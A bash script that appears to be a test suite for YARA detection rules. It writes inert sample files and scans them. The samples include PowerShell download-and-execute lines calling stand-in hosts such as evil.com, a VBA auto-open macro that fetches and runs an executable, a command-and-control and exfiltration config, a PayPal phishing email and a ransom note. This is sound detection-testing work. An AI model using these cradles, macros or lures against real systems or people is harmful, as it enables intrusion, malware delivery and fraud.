#!/bin/bash

# YARA Rules Test Suite
# Author: Joaquin Villegas
# Description: Comprehensive testing for RanDT YARA rules

set -e

echo "RanDT Rules Test Suite"
echo "========================="

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Test directory
TEST_DIR="./test/samples"
RESULTS_FILE="./test/test-results.log"

# Create test directory
mkdir -p "$TEST_DIR"

log_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

log_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Clean up previous test files
cleanup_tests() {
    log_info "Cleaning up previous test files..."
    rm -rf "$TEST_DIR"/*
    rm -f "$RESULTS_FILE"
}

# Test 1: Phishing email simulation
create_phishing_test() {
    log_info "Creating phishing email test..."
    cat > "$TEST_DIR/phishing_test.eml" << 'EOF'
From: security@paypal.com
To: victim@example.com
Subject: Urgent: Account Suspended - Action Required

Dear Valued Customer,

Your PayPal account has been suspended due to unusual activity detected on your account.
To avoid permanent closure, please verify your account immediately by clicking the link below.

URGENT ACTION REQUIRED: Verify Account Now

Please confirm your identity and update your information to restore full access.
Your account will be permanently deleted if no action is taken within 24 hours.

Best regards,
PayPal Security Team
EOF
}

# Test 2: Suspicious PowerShell script
create_powershell_test() {
    log_info "Creating PowerShell script test..."
    cat > "$TEST_DIR/suspicious.ps1" << 'EOF'
# Suspicious PowerShell script
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIASABlAGwAbABvACAAVwBvAHIAbABkACIA
powershell -enc VwByAGkAdABlAC0ASABvAHMAdAAgACIASABlAGwAbABvACAAVwBvAHIAbABkACIA
Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')
IEX (iwr 'http://evil.com/script.ps1')
EOF
}

# Test 3: Fake ransomware note
create_ransomware_test() {
    log_info "Creating ransomware note test..."
    cat > "$TEST_DIR/README_DECRYPT.txt" << 'EOF'
!!! ATTENTION !!!

YOUR FILES HAVE BEEN ENCRYPTED!

All your important files (documents, photos, videos, databases) have been encrypted with military-grade AES-256 encryption.

To restore your data, you need to pay 0.5 Bitcoin to the following address:
1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa

After payment, send an email to decrypt@recovery-service.onion with your payment proof and this ID: RANSOM_ID_12345

WARNING: Do not attempt to decrypt files yourself or use third-party software. This will result in permanent data loss.

Time remaining: 72 hours
EOF
}

# Test 4: Credential file simulation
create_credentials_test() {
    log_info "Creating credential file test..."
    cat > "$TEST_DIR/passwords.txt" << 'EOF'
# Stored Passwords
gmail:john.doe@gmail.com:password123
facebook:john.doe:mypassword
bank_login:johndoe:supersecret
api_key:sk-1234567890abcdef1234567890abcdef
secret_token:ghp_1234567890abcdef1234567890abcdef123456
aws_access_key:AKIAIOSFODNN7EXAMPLE
aws_secret_key:wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
ssh_private_key:-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7...
-----END PRIVATE KEY-----
EOF
}

# Test 5: Macro-enabled document simulation
create_macro_test() {
    log_info "Creating macro document test..."
    cat > "$TEST_DIR/suspicious_document.txt" << 'EOF'
Document contains VBA macros with the following suspicious content:

Sub Auto_Open()
    Shell "cmd.exe /c powershell.exe -WindowStyle Hidden -Command (New-Object System.Net.WebClient).DownloadFile('http://malicious.site/payload.exe', '%temp%\\update.exe'); Start-Process '%temp%\\update.exe'"
End Sub

Sub Document_Open()
    CreateObject("WScript.Shell").Run "cmd /c echo malware > %temp%\\infected.txt", 0
End Sub

Function ObfuscatedFunction()
    Dim command As String
    command = Chr(112) & Chr(111) & Chr(119) & Chr(101) & Chr(114) & Chr(115) & Chr(104) & Chr(101) & Chr(108) & Chr(108)
    Shell command & " -enc VwByAGkAdABlAC0ASABvAHMAdAAgACIASABlAGwAbABvACAAVwBvAHIAbABkACIA"
End Function
EOF
}

# Test 6: Network communication test
create_network_test() {
    log_info "Creating network communication test..."
    cat > "$TEST_DIR/network_config.txt" << 'EOF'
# C2 Communication Configuration
beacon_interval: 300
c2_server: https://command-control.malicious.com/api/v1/bot
heartbeat_url: https://evil.domain.tk/checkin
encrypted_channel: true
bot_id: BOT_12345
command_id: CMD_DOWNLOAD_EXECUTE

# Exfiltration Settings
ftp_server: ftp://data-exfil.suspicious.tk
upload_path: /stolen_data/
credentials: user:pass123

# DNS Tunneling
dns_server: tunnel.malicious-domain.ga
encoded_data: aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q=
EOF
}

# Test 7: Cryptocurrency wallet test / FAKE SCENARIO
create_crypto_test() {
    log_info "Creating cryptocurrency test..."
    cat > "$TEST_DIR/wallet_data.txt" << 'EOF'
# Cryptocurrency Wallet Information
bitcoin_address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
ethereum_address: 0x742d35Cc8C6C82532Cf8B8cB5C1b8e5C4A7b9B8
private_key: 5KJvsngHeMpm884wtkJNzQGaCErckhHJBGFsvd3VyK5qMZXj3hS
seed_phrase: abandon ability able about above absent absorb abstract absurd abuse access accident
mnemonic: witch collapse practice feed shame open despair creek road again ice least
wallet_file: /Users/victim/.bitcoin/wallet.dat
electrum_seed: 1234567890abcdef1234567890abcdef12345678
metamask_vault: {"data":"encrypted_vault_data","iv":"initialization_vector","salt":"salt_value"}
EOF
}

# Test 8: SSH key extraction test /FAKE SCENARIO
create_ssh_test() {
    log_info "Creating SSH key test..."
    cat > "$TEST_DIR/ssh_keys.txt" << 'EOF'
# SSH Key Files
id_rsa: /Users/victim/.ssh/id_rsa
id_ecdsa: /Users/victim/.ssh/id_ecdsa
authorized_keys: /Users/victim/.ssh/authorized_keys

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA1234567890abcdef1234567890abcdef1234567890abcdef
1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef
-----END RSA PRIVATE KEY-----

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1234567890abcdef user@hostname
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI1234567890abcdef user@example.com
EOF
}

# Run YARA tests
run_yara_tests() {
    log_info "Running YARA rule tests..."
    
    local total_tests=0
    local passed_tests=0
    local failed_tests=0
    
    echo "Test Results:" > "$RESULTS_FILE"
    echo "=============" >> "$RESULTS_FILE"
    echo "" >> "$RESULTS_FILE"
    
    for test_file in "$TEST_DIR"/*; do
        if [ -f "$test_file" ]; then
            total_tests=$((total_tests + 1))
            local filename=$(basename "$test_file")
            
            log_info "Testing $filename..."
            
            if yara -r rules/master.yar "$test_file" > /dev/null 2>&1; then
                local matches=$(yara -r rules/master.yar "$test_file" 2>/dev/null | wc -l)
                if [ "$matches" -gt 0 ]; then
                    log_success "✓ $filename - $matches rule(s) matched"
                    echo "PASS: $filename - $matches rule(s) matched" >> "$RESULTS_FILE"
                    passed_tests=$((passed_tests + 1))
                else
                    log_warning "- $filename - No rules matched (might be expected)"
                    echo "SKIP: $filename - No rules matched" >> "$RESULTS_FILE"
                fi
            else
                log_error "✗ $filename - YARA scan failed"
                echo "FAIL: $filename - YARA scan failed" >> "$RESULTS_FILE"
                failed_tests=$((failed_tests + 1))
            fi
        fi
    done
    
    echo "" >> "$RESULTS_FILE"
    echo "Summary:" >> "$RESULTS_FILE"
    echo "Total Tests: $total_tests" >> "$RESULTS_FILE"
    echo "Passed: $passed_tests" >> "$RESULTS_FILE"
    echo "Failed: $failed_tests" >> "$RESULTS_FILE"
    
    log_info "Test Summary:"
    log_info "Total Tests: $total_tests"
    log_success "Passed: $passed_tests"
    if [ "$failed_tests" -gt 0 ]; then
        log_error "Failed: $failed_tests"
    fi
}

# Main test execution
main() {
    cleanup_tests
    
    # Create all test files
    create_phishing_test
    create_powershell_test
    create_ransomware_test
    create_credentials_test
    create_macro_test
    create_network_test
    create_crypto_test
    create_ssh_test
    
    log_success "Test files created in $TEST_DIR/"
    
    # Run tests
    run_yara_tests
    
    log_info "Detailed results saved to: $RESULTS_FILE"
    
    # Cleanup option
    echo ""
    log_info "Keep test files for manual inspection? (y/n)"
    read -r keep_files
    
    if [[ $keep_files != "y" && $keep_files != "Y" ]]; then
        rm -rf "$TEST_DIR"
        log_success "Test files cleaned up"
    else
        log_info "Test files preserved in $TEST_DIR/"
    fi
}

# Check if YARA is available
if ! command -v yara &> /dev/null; then
    log_error "YARA not found. Please install YARA first:"
    log_info "macOS: brew install yara"
    exit 1
fi

# Check if rules exist
if [ ! -f "rules/master.yar" ]; then
    log_error "master.yar not found. Please ensure YARA rules are present."
    exit 1
fi

# Run main function
main
